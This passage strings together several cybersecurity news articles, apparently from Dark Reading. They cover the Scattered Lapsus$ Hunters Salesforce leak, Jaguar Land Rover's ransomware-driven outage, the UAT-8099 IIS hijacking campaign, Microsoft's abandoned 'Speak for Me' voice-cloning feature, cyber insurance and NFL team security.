attempts by threat actors, which we have investigated in partnership with external experts and authorities. Our findings indicate these attempts relate to past or unsubstantiated incidents, and we remain engaged with affected customers to provide support. At this time, there is no indication that the Salesforce platform has been compromised, nor is this activity related to any known vulnerability in our technology,"" the company said.Scattered Lapsus$ Hunters Names Alleged VictimsAmong the 39 organizations listed on the leak site are many well-known brands that, to this point, have not disclosed any Salesforce-related data breaches. The list also includes victims that have suffered previously reported breaches, such as Chanel and Qantas Airways.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessIn a message to Salesforce on the leak site, Scattered Lapsus$ Hunters said it also ""dumped over 100+ other unnamed instances because you do not enforce 2FA or any other type of OAuth Apps security.""The cybercriminal group claimed the stolen data includes personally identifiable information (PII) such as Social Security numbers, driver's license numbers, and birth dates. Scattered Lapsus$ Hunters also threatened to file reports with regulatory agencies as well as cooperate with law firms that may pursue litigation against Salesforce over the breaches.In its Telegram channel, Scattered Lapsus$ Hunters said it plans to launch a second data leak site after the Oct. 10 deadline that will be devoted to ""our (UNC6395) Salesloft Drift App campaign."" The message refers to the other, separate campaigns of attack against Salesforce instances by threat actors tracked as UNC6395 by Google.In that campaign, the attackers used stolen OAuth tokens from a third-party integrated application, Salesloft Drift, to access customers' Salesforce environments. Salesloft last month disclosed that a threat actor obtained the tokens after compromising its GitHub account sometime between March and June this year.Related:UAT-8099 Hijacks Reputable Sites for SEO Fraud & TheftMany technology companies were impacted by the Salesloft Drift attacks, including Palo Alto Networks, Zscaler, Cloudflare, Proofpoint, Qualys, Tenable and Bugcrowd. It's unclear at this point if UNC6395 is indeed part of the Scattered Lapsus$ Hunters collective.However, threat analysts have said the apparent cooperation between Scattered Spider, Lapsus$, and ShinyHunters group appears to be more than just social media boasting.""Public statements from ShinyHunters suggested a clear division of labor: Scattered Spider provided initial access, ShinyHunters specialized in data theft and publication, and LAPSUS$ members acted as amplifiers and extortionists,"" said SOCRadar in an updated profile of Scattered Lapsus$ Hunters.In a blog post this week regarding the UNC6040 attacks, Mandiant researchers urged organizations to be aware of social engineering threats and to implement additional layers of verification for calls to IT help desk personnel for both internal employees and third-party partners."

Dutch authorities last week arrested two 17-year-olds who are suspected of conducting cyber-espionage activities for Russia-backed threat actors.Prosecutors say the teenagers are accused of ""government-sponsored interference"" on behalf of Russian hackers, according to Dutch media reports. The two suspects, who have not been publicly identified because of their ages, allegedly used a Wi-Fi sniffer as they walked around areas of The Hague, several embassies, and headquarters of Europol and Eurojust. A Wi-Fi sniffer is a device that maps networks and is capable of intercepting data. Dutch intelligence agency AIVD was reportedly the first to inform police about the teenagers' activities, prompting a raid into their homes. According to Dutch newspaper De Telegraaf, the two suspects were approached via Telegram, a popular messaging service widely used by cybercriminals.One suspect is being monitored while under house arrest and the other will remain in custody until a court hearing scheduled for next week. Both teenagers were brought before an examining judge last week. In a press conference at The Hague, Dutch Prime Minister Dick Schoof noted that the incident fits a pattern of a type of hybrid attack conducted by Russia against Europe.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak Site""It's extremely worrying that these children are being used for this,"" he said, according to a Reuters report.Growing Pattern: Russian Exploitation of Foreign YouthThe news illustrates what may be a rising trend of Russian threat actors utilizing the youth of foreign countries to do their dirty work.""The alleged use of a simple wi-fi sniffer emphasizes how nation-state actors can outsource reconnaissance to impressionable youth via social media, propaganda, and ultimately shield themselves from attribution,"" said Morey Haber, chief security advisor at BeyondTrust, in an emailed statement to Dark Reading. ""For organizations, if teenagers can be weaponized via Telegram (or any social media) to provide network infrastructure intelligence, adversaries are only a few connections away from breaching critical systems. CISOs and government leaders must consider this the new normal.""Haber added that state-level actors are once again engaging with cyber mercenaries, though today they are ""young, motivated, low cost, easily manipulated, and ultimately disposable.""The arrests of the Dutch teenagers also follows growing concerns about the rise of ""Advanced Persistent Teenagers"" and the possibility of Russian influence over hacker collectives predominately composed of young, native English speaking individuals. Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessJust recently, a member of notorious cyber gang Scattered Spider turned himself over to the authorities at a Juvenile Detention Center in Las Vegas. Prior to that, several other teenage members in the group were arrested, including 19-year-old Remington Goy Ogletree, two other 19-year-old men, and a 17-year-old man.According to Trey Ford, chief strategy and trust officer at Bugcrowd, there are signs that parents can watch out for if a teenager is involved in such activity. This includes funds or new gadgets with little to no explanation as to how or where they acquired them."

The month-long outage for luxury car maker Jaguar Land Rover appears to be at an end, with the company working through a ""controlled, phased restart"" of its manufacturing operations this week, following a massive cyberattack that forced the company to shut down its systems.JLR said on Sept. 2 that it had ""proactively"" shut down operations following a cyber incident, initially stating that customer data did not seem to be stolen, but revising that statement a week later. JLR, a subsidiary of Tata Motors, likely suffered $50 million to $70 million in lost revenue per week, with the total cost of the incident estimated at a staggering $1.7 billion to $2.4 billion.The attack, and its vast impact, should be a warning for companies, says Chris Gibson, executive director of the Forum of Incident Response and Security Teams (FIRST).The outage ""highlights that even large corporations with substantial resources can be completely disrupted and that critical industries may be more vulnerable than previously thought,"" he says. ""This was far beyond data theft, it was a complete operational outage.""Automakers have become a favored target of ransomware gangs, as compromising their IT systems can lead to operations outages and faster payment. Honda suffered an outage in 2017 as it struggled to deal with the widespread WannaCry attacks, and again in 2020, when the company took its manufacturing offline following a compromise. Overall, about half of the top-100 automobile manufacturers are highly susceptible to ransomware, a 2022 report concluded.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteYet, the makers of automobiles are not the only manufacturers in cybercriminals' sights. Third-party manufacturer Visser Precision — which supplies parts to Tesla, SpaceX, and Boeing — suffered a breach in 2020. The HELLCAT gang claimed to have stolen sensitive data from industrial control system (ICS) maker Schneider Electric in 2024. And in June, steelmaker Nucor acknowledged a breach of its systems dating back to May 2025, with limited impact on operations.Opportunity Costs of Failed DefensesA Telegram channel using the name ""Scattered Lapsus$ Hunters"" — an amalgamation of three well-known groups: Scattered Spider, Lapsus$, and ShinyHunters — claimed responsibility for the attack by showing a screenshot of JLR's internal systems, according to threat researchers. For its part, JLR has not released any details of its investigations, but the company is working with third parties.""Today we are informing colleagues, retailers, and suppliers that some sections of our manufacturing operations will resume in the coming days,"" JLR said in a Sept. 29 statement. ""We continue to work around the clock alongside cybersecurity specialists, the UK government's NCSC and law enforcement to ensure our restart is done in a safe and secure manner.""Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageThe company has stopped manufacturing at multiple factories, which typically produce 1,000 vehicles a day, according to reports. While the manufacturing ""pause"" was initially to be short-lived, the company extended it to Oct. 1.The IT systems outage at the end of August was not the first sign of trouble that the company had. In March, the HELLCAT ransomware group leaked 700 internal documents, purportedly part of a compromise of JLR's internal network using Jira credentials and also included development logs, source code, and a large employee dataset with usernames, email addresses, display names, and time zones, according to an analysis by threat intelligence firm Cyfirma.The screenshot posted by the Scattered Lapsus$ Hunter group appears to show some development issues, and while the information leak may not have posed a risk on its own, the exposure of internal systems should have been concerning, the analysts stated.""The targeting of operational systems, critical infrastructure, and connected vehicle modules suggests an interest in demonstrating control and influence, possibly to intimidate the company and its partners,"" Cyfirma stated in the analysis. ""While there is no direct evidence of ransom demands, the group could leverage the data for future exploitation or sell it, indicating potential financial incentives.""Related:UAT-8099 Hijacks Reputable Sites for SEO Fraud & TheftThe Making of an OutageThe massive impact of the attack on JLR holds lessons, says FIRST's Gibson. The compromise was especially damaging because the company's systems were not appropriately segmented and attackers were able to impact both IT and OT systems. In addition, the attackers likely retained network access from the March compromises, enabling them to pick the worst time to cause an outage — ""New Plate Day,"" one of the busiest sales days of the year.""In short, JLR was targeted at a strategically vulnerable time, on a network that attackers already understood, which compounded the severity of the disruption,"" he says.Manufacturers need to better their defenses and make their operations more resilient to cyberattacks, starting with strict segmentation of networks to limit lateral movement and use of multifactor authentication (MFA) to limit external access. Finally, even small security incidents should have thorough post-mortem remediation to ensure that attackers cannot maintain persistence.""The JLR incident [shows] while prevention is critical, resilience determines the scale of impact,"" Gibson says. ""Manufacturers should focus on a key lesson, building systems that can withstand and recover from inevitable breaches."""

Who hasn't argued over which superpower they'd choose if the chance arose: teleportation, super strength, flying, telekinesis, mind control, or technopathy? The latter may be realized sooner rather than later due to emerging advances in brain computer interface (BCI) technology.The BCI field is currently in research, experimental, and small-scale stages, but the goal is to open a new communication pathway, one where users control devices with their minds. Implants directly into the brain would enable people to text, scroll social media, watch a favorite show, pay a bill, order takeout, or shop without ever physically touching a device. Simply think of an action — and voilá.Several different use case variations already exist. Helping paralyzed people or individuals lacking motor function are the most common for now. That is an example of BCIs working from the outside in, but they can also work the other way around, explains Christo Butcher, global head of threat intelligence at the NCC Group's research and intelligence fusion team.  ""Examples include patients with depression, addiction, epilepsy, and neurolevel problems,"" Butcher says. ""Maybe through some kind of stimulation, BCI would be able to help those people. The vision is for [BCI] to become a part of everyday life.""Related:Digital Fingerprints Test Privacy Concerns in 2025Security Must Match the RiskMany current use cases are hypothetical or limited to helping certain individuals. However, impenetrable security will be essential if BCI ever does become intertwined in daily life because the technology raises many daunting concerns. It's one thing if a threat actor hacks a laptop; it's a whole other nightmare when the brain becomes the target.Security must be prioritized from the beginning, but that has proved difficult historically. Despite initiatives like Secure by Design (SbD), security shortcomings are plentiful, and attackers take advantage of those gaps. Every day more reports on ransomware attacks and data theft emerge.""The current level of security we're used to inside enterprise and consumer products is not what we would like to see for BCI,"" Butcher says. ""It's not what we want for normal IT systems now, but it is the world we live in.""How Do BCIs Work?While it's easy to preach security from the beginning, it is hard to do because BCI are not simple systems. They require sensors and either an implant in the brain or a wearable device. That generally requires custom hardware and software, as well as signal processing on a laptop or tablet, Butcher explains. Additionally, cloud systems are required to do the more powerful artificial intelligence and machine learning aspects to complete the output.Related:Gaps in California Privacy Law: Half of Data Brokers Ignore RequestsEven though BCI application is new, all the required parts — firmware, hardware, software, and operating systems — are vulnerable, he says.""We know they are complex enough to contain flaws,"" Butcher says. ""From an attack surface point of view, they are rich targets, which is why it's important to include security from the beginning."" Avoid Generic Security ChecklistsWhile BCI applications may be new, many of the problems are familiar. For example: How can device makers create products that users can trust, especially in situations where security shortcomings could mean life or death?Companies that are building these systems should adopt a mentality of ensuring well-known controls, like multifactor authentication and updates, are implemented during design, development, and production, Butcher says.BCI investments are growing, but it's even more important to focus those investments on validating that the system is difficult to hack. Butcher advises enterprises to understand what could go wrong and make sure security matches that risk.""Don't base security on some sort of generic checklist,"" he warns. Related:Paragon Commercial Spyware Infects Prominent Journalists'It's The Ultimate Social Engineering Tool'The list of what could go wrong is alarming. Security concerns revolve around privacy and identity and will require new regulations and policies to address.Because BCI is implanted directly into the brain, there could be psychological manipulation, as well. Threats like ransomware have already grown into emotionally manipulative tactics with publicly announced data extortion threats. What if an attacker could ransom someone in their head?   Social engineering and phishing are more pressing concerns, though. For example, threat actors could convince users to hand over sensitive information or transfer money, as is common during business email compromise attacks.""It could be used to convince people to legitimately do the wrong thing,"" Butcher says. ""If you could do that as a criminal — somehow influence people — it's the ultimate social engineering tool.""Butcher also raised the alarm on potential disinformation or propaganda risks, highlighting how it could be a dream tool for any dictator. Disinformation, particularly with deepfakes, is already a burgeoning threat, but attackers could abuse BCI to influence what people think and feel, taking it to a whole other level. However, Butcher notes these risks are still far away and dystopian.What Does the BCI Landscape Look Like?BCI research is picking up steam, with more players emerging onto the scene. Precision Neuroscience began work in 2021 and has developed a Layer 7 Cortical Interface, a component of its BCI system that received FDA clearance but is not commercially available yet, according to the company. Like others in the field, Precision's goal is to apply the product to help paralyzed people.When thinking about security, co-founder and CEO Michael Mager tells Dark Reading that the company is committed to meeting Health Insurance Portability and Accountability Act and FDA requirements for Class III medical devices — those with the greatest risks. Precision is also a member of the Implantable Brain-Computer Interface Collaborative Community, which focuses on industrywide efforts to define new cybersecurity and data privacy standards.Measures such as hardware-level encryption and continuous monitoring will help Precision do so, Mager says.Blink Once for YesWyrde AI is another new BCI company, but its product is an example of a noninvasive application. Rather than being implanted into the brain, users wear glasses that operate with BCI technology. The glasses are embedded with audio and video recording and EEG sensors that read brain signals.When the phone rings, users can blink twice to accept the call or three times to reject it. Alternatively, glasses can be used to automate home appliances or to switch on a fan or TV; the eyes replace the remote control. The recording capability could also act as a memory feature to help users find lost wallets and keys. Eventually, another goal is that users will be able to communicate without even speaking.Currently, Wyrde's product is still at its early stages, but the founders hope to develop a prototype very soon. The software side is grounded, but hardware is a work in progress, explains co-founder and CTO Bhaskar Tripathi.Because they are developing the glasses for the European markets, the founders are focused on a privacy-first approach to comply with the European Union's General Data Protection Regulation. They call it ""building privacy by design.""Privacy is the biggest concern for now because the brain is so intimate and personal. Data security is essential as well, especially encryption during transit, which is currently lacking from many manufacturers these days, Tripathi says. He is most concerned about signal injection attacks. While developing the glasses, the founders are not only considering current regulations, but anticipating new policies that may arise.""BCI is a growing research area, and a lot of things are not documented,"" Tripathi says. ""We're taking care of areas as much as we can, but there will be things we will learn after it's getting used, and we will learn more."""

A new cybercrime group has been infecting Web servers and stealing sensitive information from reputable organizations in a variety of geographic regions.A vulnerable Internet-facing server is a doormat for anyone in the world with a keyboard and a bad intention. Hackers can use them as the first step for just about any kind of attack, and when UAT-8099 picks yours, it doesn't settle for just one kind.Cisco Talos researchers have discovered this new-ish cybercrime operation hijacking Internet Information Services (IIS) servers at reputable organizations. The servers serve dual purposes: they help the attackers funnel mobile search engine traffic to spam advertisements and illegal gambling websites, and they're home to sensitive access data the attackers could theoretically sell off or use for follow-on attacks.In many ways UAT-8099 resembles other Chinese-language SEO fraud groups, like the one ESET refers to as ""GhostRedirector,"" and the one Palo Alto Networks' Unit 42 named ""CL-UNK-1037,"" itself linked to a group Cisco Talos calls ""Dragonfly."" The exact dividing lines between these different operations remains murky. Cisco Talos declined to provide more information to Dark Reading about its research.Hijacking Reputable Sites for SEO FraudRelated:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteThe kinds of servers UAT-8099 takes interest in are run by significant organizations — technology companies, telecommunications providers, universities, etc. — in countries across the world, including Brazil, Canada, India, Thailand, Vietnam.These organizations' IIS servers are utterly ripe for the taking. Not only are the servers discoverable in the first place, but they're configured to allow for totally unrestricted file uploads. It's trivial to upload an open source (OSS) Web shell to such a server, then begin collecting reconnaissance information.From here, the attackers will utilize a guest account on the server, escalate its privileges until it has administrator status, and enable Remote Desktop Protocol (RDP) access to the server. They also utilize a handful of other OSS reverse proxy and virtual private network (VPN) tools for remote access, and an IIS security program called ""D_Safe_Manage"" to secure the server on their victim's behalf, only so that they can enjoy exclusive access to it.Ultimately they install ""BadIIS,"" a go-to for Chinese-speaking threat actors who focus on search engine optimization (SEO) fraud. It appears to be a kind of general term for IIS implants that intercept website traffic for the dual purpose of SEO poisoning and malicious redirects.Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageIn UAT-8099's case, for example, BadIIS sits on a reputable organization's website and waits for visitors. If that visitor is a search engine crawler, it will flood the crawler with SEO terms helpful for ranking high in searches about online gambling and gaming: ""gambling,"" ""cash,"" ""bet,"" etc.If the visitor is human, and they intended to visit the site for legitimate purposes — for example, they're a student looking for university resources — they'll be left untouched by BadIIS.Thanks to the good reputation of the compromised website, and BadIIS's efforts to persuade search engine crawlers, there's also a third scenario: a human visitor arrives who searched online for something like an online casino, and was served a compromised UAT-8099 result. These visitors, once identified, get redirected to scammy ads and gambling sites in their native languages.In a way, then, both the attackers and the victim get what they want. Legitimate visitors get the normal user experience the compromised organization intended, but the attackers get to leech off their good name to promote their scams.Should Anyone Actually Care?UAT-8099 most directly harms its victims through data theft. It doubles down on its access to those vulnerable servers by dropping a Cobalt Strike backdoor and gathering a variety of credentials, configuration files, and certificate information useful for follow-on attacks (or for selling on the Dark Web).Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessBesides that, though, UAT-8099's attacks are mostly invisible to the organizations it targets, and the users of those organizations' websites. Not only does that make its attacks difficult to spot, it can also make them difficult to care about.Grayson North, principal threat intelligence consultant with GuidePoint Security, recalls talking to frustrated members of a national Computer Emergency Response Team (CERT) about this kind of attack. ""They have a way of detecting websites that are compromised in this manner, and they'll go and reach out to site owners and say they're compromised,"" he says. ""[The site owners] will go look at their website and see that none of the code has changed. And they say 'No, we're not compromised, we're good here.' And then they stop responding to emails.""Unlike other kinds of cyberattacks, ""in reality, it is difficult to try to convince them to care and remediate this issue,"" he laments. Even where the consequences aren't so immediate, however, organizations would be well-advised to clean up their Web infrastructure. ""The thing here is that the same vulnerability that is being used to insert these hidden links in your legitimate organization's website is actually quite powerful"" in other ways, Netcraft director of engineering Graham Edgecombe points out. The same kind of attack can be used to change the content of a targeted website. ""It can be used to, for example, insert a script in your website,"" he says. ""And the script could do something like record your cookies and send your cookies to an attacker, or log usernames and passwords or log credit card details, and all of those things would affect your website and your legitimate website users directly."""

""Speak for Me"" (S4M) was envisioned as a niche Windows accessibility feature for those on their way to losing their voice due to medical procedures like tracheotomies or progressive voice disorders. A noble idea to be sure, but in practice things turned out a little differently: Microsoft managed instead to create one of the world's best deepfake, vishing, and fraud vehicles, thanks to a raft of development bugs.The innovative feature aimed to enhance Microsoft's existing text-to-speech interface, offering capabilities such as creating a virtual microphone for seamless use in conferencing apps like Microsoft Teams or for use in personal voice translators.Users would simply type what they wanted to say, and instead of the familiar ""robot voice"" that most accessibility features use, listeners would hear an uber-realistic facsimile of the person's actual vocal patterns.The issue of course is that, in the wrong hands, this kind of capability could be a golden ticket to mounting incredibly effective impersonation cons, should attackers be able to highjack someone's voice model. And, since Microsoft wanted it to be a universal feature that could be integrated into any number of apps, it would give those attackers concerning levels of reach. Luckily though, the tech giant saw the problems before S4M went into widespread production, eventually deeming them too large of an issue to surmount.Related:Red Hat Investigates Widespread Breach of Private GitLab RepositoriesDespite its (mostly) abortive status, the feature should be seen as a cautionary tale for others, as AI developers continue to pursue ever better voice-cloning capabilities, argued Microsoft's Andrey Markovytch, speaking at the SecTor 2025 conference taking place in Toronto this week.  Speak for Me: Best-Laid Voice Cloning PlansMarkovytch, a senior security researcher at the company, explained in a SecTor session entitled ""What Happens When Your Digital Voice Clone Goes Rogue"" that, above all, S4M was envisioned as offering an easy but secure way to replicate a user's voice, using just a few samples. Users were asked to simply repeat a few random phrases generated within the set-up interface, which were then used to train an AI model in the cloud on their voices. The process is similar to the way Apple logs users' voices for use with Siri on iOS devices.And while it was originally conceived as an accessibility feature, S4M offered several notable advanced capabilities, which, taken together, make up a nearly ideal toolkit for a scammer, eavesdropper, saboteur, or worse:Integration into Windows ecosystem: It can be configured as a virtual microphone and used seamlessly as part of Teams or any other communication apps compatible with Windows.Universal accessibility: Even though it was originally intended for people with disabilities, it could actually be used by everyone.Powerful scenarios: In the era with different agents and virtual copilot personas, the feature could be used to make or answer calls on one's behalf, perform automated tasks where voice authentication is required, listen in and participate in meetings; or even interact with multiple AI agents at once across multiple applications.Related:Sneaky, Malicious MCP Server Exfiltrates Secrets via BCCThe feature was being developed even as voice-based scams and impersonation attempts are on the rise, targeting both consumers and enterprises. There's an epidemic of deepfaked scam calls targeting older Russian-speaking populations in Israel for instance, including Markovytch's own mother, he said, with some people receiving as many as five scam calls a day from believable but fake versions of their loved ones. On the enterprise side, the attacks are as varied as content creators being targeted by YouTube CEO deepfakes and North Koreans posing as US-based IT job candidates. Recently, researchers warned that financial fraud linked to synthetic identities is rising again, with firms potentially facing $3.3 billion in damages from new deepfake accounts.Related:Akira Hits SonicWall VPNs in Broad Ransomware CampaignVoice Cloning Turns Ugly: Bugs, So Very Many BugsMicrosoft thoroughly vetted the application and uncovered a trove of vulnerabilities, across both client-side and cloud components. To understand those, it's worth taking a look at the infrastructure of the app.Speak for Me desktop client: Presents the graphical user interface and manages models locally.Communication: The client app communicates with the S4M back end via an Azure AD gateway, which provides protection for gateway endpoints with filtering, rate limiting and other features.Back-end services: The S4M back end talks to the Custom Neural Voice (CNV) service, which is the service that actually trains the model.Local and cloud storage: The model is downloaded and stored on the device in an encrypted form, and the encryption key is encrypted by the Windows Key library and also stored in encrypted form on the device. But there is also a backup on the cloud side, which is managed via Azure blob storage.Existing software development kit (SDK): The S4M user interface leverages the existing accessibility feature in Windows, the text-to-speech SDK.Markovytch noted that the main concern of the product team from the beginning was the abuse of the technology for the production of deepfakes, so they focused in on securing the local model storage and the framework responsible for model training, deploying numerous mitigations on both the local side and on the cloud side. For instance, the model's data was encrypted during transit and at rest, and a dedicated watermark mechanism was embedded into each generated voice to distinguish genuine voice from generated voice. Meanwhile, users were required to record a special predefined consent message, and the model in the cloud verified that the consent voice matched the voice used for training samples.However, the security measures fell significantly short. For one, the model was managed using the speech SDK, which was previously used only for generic voice models and provided only basic encryption that would be trivial to break.Then there were the additional security vulnerabilities. These included:Path traversal vulnerability: Attackers could access training data and models of any arbitrary user.Insecure storage: All data was stored in one global blob storage separated only by different folders with no additional permission checks.Key management issues: The encryption key for the model was stored along with the model itself instead of using Azure Key Vault.Notification system abuse: Attackers could take control of the backend Windows Push Notification Service.Financial abuse: Even though there could only be one voice clone per user at any one time, users could create and delete models in loops or create multiple accounts. Since each clone cost Microsoft a few dollars each, there was potential for significant financial harm to the company.Runtime protection issues: Since the whole application runs as a regular user application, any malware on the same machine could dump the model from memory.Runtime bugs in the watermark mechanism: Malware could disable it or force the application to apply watermarking to arbitrary voice samples.Could Windows Speak for Me Be Saved?The team evaluated a number of mitigations, including using Virtual Based Security, which introduces concepts like secure kernel and virtual trust layers that provide hypervisor-level protection. However, VBS doesn't encrypt memory from lower layer attacks, and physical attackers can still dump memory.The other idea was to use ""confidential virtual machines.""""These rely on special hardware and encrypt VM memory, protecting against physical memory dumps,"" explained Markovytch. ""They also support attestation technology for secure key release. However, the technology is currently not available on general purpose PCs and is only available for data center servers.""They also found that in practice, to fully mitigate voice cloning problems, specialized secure peripherals like secure cameras or microphones are needed, along with watermark protection that's secured inside a secure enclave in memory.""But not everyone has the SDK to check watermarks, making the protection useless if there's no one to verify it on the receiving end,"" Markovytch continued.So in the end, given the inability to see a way to make the feature securely available to everyone, Microsoft had to make the tough decision to abandon the feature for general use (those in specialized circumstances can still apply for the feature, completing a manual verification process).AI Models Require Special Security ConsiderationsAI models are powerful, and with great power comes great responsibility. AI-enabled voice-cloning capabilities in particular are reaching unparalleled levels of verisimilitude, with the capacity for creating immense positive change — or dystopic levels of deepfake risk, depending on how it goes.And indeed, S4M gave Microsoft's AI product development teams Oppenheimer-level pause when it came to the risk-reward tradeoff, and was deemed just a little too capable of detonating a fraud-based mushroom cloud of impersonation misery. But, there are other options out there that seem to have no such qualms.Using one of these, ""attackers could steal your voice recordings and use external open source or commercial infrastructure, without any mitigations and without any restrictions, to train a model from your voice,"" Markovytch cautioned. ""Some of these require as little as 15 seconds to produce such a digital copy.""Going forward, security measures must extend beyond individual applications to include ecosystem-based verification systems, and developers need to be aware that with great power comes great responsibility, Markovytch warned.""Protecting AI on client devices is hard on general purpose devices,"" he said. ""AI is developing and advancing at meteoric speeds, while security does not necessarily advance at the same pace.""He added, ""Most AI security focuses on keeping bad actors out of AI models, but as AI becomes more powerful and agentic, the focus might need to shift toward keeping bad AIs contained. Sometimes the most responsible approach is to slow down and ensure that models can be secured properly before release, or not release them at all."""

Showman P.T. Barnum once said, ""There's a sucker born every minute."" Had he been a cybersecurity expert, he might have changed that to say, ""There's a cybersecurity vulnerability published every 12 minutes."" He wouldn't have been far off.When it comes to insuring against cyber-risk, some insurance carriers and brokers take a proactive, collaborative approach to help policyholders mitigate their risks. Others opt for a more assertive stance by penalizing policyholders for not promptly patching vulnerabilities. Achieving the right balance of risk and coverage is largely left to the companies themselves.Vulnerabilities are proliferating, according to the tally of Common Vulnerabilities and Exposures (CVE) published by MITRE to track software security bugs. By mid-September of this year, MITRE had listed approximately 33,000 CVEs, nearly double the 18,400 published in all of 2020. At this rate, we can expect to see nearly 47,000 this year, and those are just the ones that are published. Many vulnerabilities are never assigned a CVE, and a backlog of vulnerabilities also awaits assignment. Bottom line: Many vulnerabilities need to be manageed, and the number is growing exponentially every day.Conversations with insiders suggest that the insurance industry is adopting a combination of approaches to address the increasing risk. Some carriers and brokers offer services to help policyholders address CVEs and other threats, such as proactively scanning networks and alerting to potential vulnerabilities. Others, such as Chubb, penalize policyholders that fail to address known threats in a timely manner, according to an industry insider who requested anonymity because they were not authorized to speak on the topic.Related:7 Lessons for Securing AI Transformation From Digital Guru Jennifer EwbankThe penalty approach is based on a ""period of neglect,"" where coinsurance share increases based on the number of days an exploit wasn't addressed, and limits of insurance are reduced accordingly. These terms are not new, and the insider tells Dark Reading that they are often negotiated out of the policy. Chubb did not respond to requests for comment.Concerns over cyber-risk have risen for the first time since 2021, says Aidan Flynn, head of underwriting management, cyber risks, at Beazley. The UK-based cyber insurance provider's latest ""Risk & Resilience"" report found that 29% of global executives cited cyber-risk as their greatest threat, up from 26% in 2024.With risk awareness growing, executives feel more prepared for evolving cyber threats, says Flynn, noting that the perception of resilience has risen from 75% in 2024 to 83% this year. Related:Secure AI Use Without the Blind Spots""[This] downplays the reality of today's cyber and technology threat landscape, which is increasingly fast-moving and unpredictable, with new CVEs materializing at a rapid rate,"" he says.A Holistic Look at RiskCVEs are a concern, but they are just one part of the discussion when an insurance prospect or policyholder is talking to an underwriter ""who is really holistically looking at companies' cyber-risk management strategy,"" says David Anderson, vice president of cyber liability at Woodruff Sawyer, a national insurance brokerage.Companies need to focus beyond CVEs, he says. ""It's not the defining factor in a company's survival after a cyberattack,"" Anderson says, ""because if it wasn't this one CVE that was exploited and someone wanted to get in, they were going to exploit it some other way.""Anderson acknowledges that the soaring number of CVEs can be a challenge for security teams, but the main discussions with underwriters continue to be about patching cadence and making sure that critical and high-severity CVEs are patched within seven days.Companies generally look to patch their critical applications first, as they are often asked by their insurers about their patching cadence, says Alexandra Bretschneider, vice president and cyber practice leader at Johnson Kendall Johnson, an independent insurance brokerage and risk management advisory firm.Related:Google Chrome Enterprise: Extend Protections From Browser to OSTheir challenge is identifying criticality: Is the vulnerability in the application itself, or might it be a mundane application that interacts with the critical application? Security personnel could address vulnerabilities to critical applications on a daily or weekly basis, while other applications are patched bimonthly or monthly, Bretschneider explains.For example, she cites the 2017 Equifax breach, caused by an unpatched Adobe application that interacted with other critical applications. She queries: Should Equifax be faulted for prioritizing critical applications and shunting the Adobe app to a lower priority, even though it ultimately proved to be the weak link in the chain?Attorney Kenneth Rashbaum, a partner at New York firm Barton LLP, emphasizes that policyholders need to read their entire policy to fully understand their obligations, as well as reread their applications to ensure they are implementing the security controls to which they attested. They also need to be aware of what coverage they purchased and what they did not.""One thing to remember: Insurance, from the legal perspective, is a contract,"" he says. ""You only get the coverage specified in the contract."" If there is an exclusion, the company needs to be aware of those limitations, he adds.Technology is surpassing policy language, Rashbaum says. He warns that the force majeure and war exclusions in policies may not align with today's potential cyberattacks and should be clarified before signing the policy.""If you want to have your exclusion fit the current information environment, you're the drafter of the agreement. You change it,"" he says. ""You can't expect the insurance company to change it."""

To find out more, we spoke with a cyber-defense coordinator from the Cleveland Browns.
Before the 2025 National Football League (NFL) draft in April, Jax Ulbrich — a 21-year-old Ole Miss student — was visiting his parents' house when he saw his father had left his iPad unattended. His father was the defensive coordinator for the Atlanta Falcons. Jax grabbed the tablet and copied down the phone number belonging to Shedeur Sanders, a college quarterback and celebrity.On Draft Day Two, Sanders received what he thought was the most important call of his life, from New Orleans Saints general manager (GM) Mickey Loomis, telling him he was about to be drafted. It was a prank call from Jax.Every year, the NFL faces cybersecurity threats that are equivalent to, and in some ways surpass, those of most other organizations. A quarterback's data can leak from an unattended iPad. At a larger scale, there are stadiums, which pose a soup of bring-your-own-device networks and third-party risks.For the Cleveland Browns — the team that ultimately picked Sanders in the third draft round — the responsibility to secure an entire NFL organization from cyber threats rests with three individuals: vice president of IT Brandon Covert and two other employees. They oversee everything from scoreboard integrity to biometric systems for fans, as well as emails the coaches might open on their iPads.Related:SentinelOne Announces Plans to Acquire Observo AIThat job has never been more daunting than it is today. Teams have suffered some high-profile cybersecurity incidents in recent years, most notably a skimming attack against the Green Bay Packers' pro shop and a ransomware attack on the San Francisco 49ers. Additionally, in some respects, the league's most important strategic goals for 2025 — capitalizing on the exploding demand for online gambling and pushing to internationalize the game — are introducing new areas of risk.Growing Risks for NFL TeamsUntil 2022, the NFL had never hosted a game outside of the US, London, or  Mexico City. This year it's hosting its most international games ever in one season — seven — in London, Berlin, Madrid, Dublin, and São Paulo. On Oct. 12, the Browns will travel to the Tottenham Hotspur Stadium in North London. The data privacy and security laws to which the organization will be subject in the United Kingdom differ from those in Ohio.Beyond games, the league is pushing harder than ever to market to global audiences. Its new ""Global Markets Program"" awards teams the rights to build brand awareness in specific countries through marketing campaigns, events, and other initiatives. The Cleveland Browns enjoy exclusive rights to Nigeria.Related:New Quantum-Safe Alliance Aims to Accelerate PQC Implementation""Privacy of fan data is becoming really important, especially as the league goes international,"" Covert tells Dark Reading. ""We haven't executed much [in Nigeria yet], but we've started to try to understand the privacy landscape and the data security landscape, as well as just the cultural differences and expectation differences.""The only way to comfortably account for regulatory differences in Ohio, London, and Lagos is to adopt a policy of the greatest strictness. Case in point: The Browns adhere to the California Consumer Privacy Act for all fans, regardless of whether they're California residents.Another fattening area of risk for all American sports teams is online gambling. In just the handful of years since it was legalized again, sports betting has become a $100 billion industry. Now every game, play, and even minor aspects of the sport carry significant financial consequences for one out of five fans.""As more and more people get into sports betting, we're trying to work-shop where the additional threat comes from,"" says John Dwyer, deputy CTO at Binary Defense, a cybersecurity partner to the Browns. In one recent workshop, a scenario emerged where someone tried to impact the outcome of a game by targeting an athlete while they were traveling, he recalls.Related:Startup Spotlight: Twine Security Tackles the Execution Gap""They try to take the star player out of the game so they can impact the results,"" he says. ""With sports gambling, it's something that needs to be considered. And kinetic threats usually manifest themselves online first.""Managing a Football Team (in Cyberspace)Whether it's fans' data 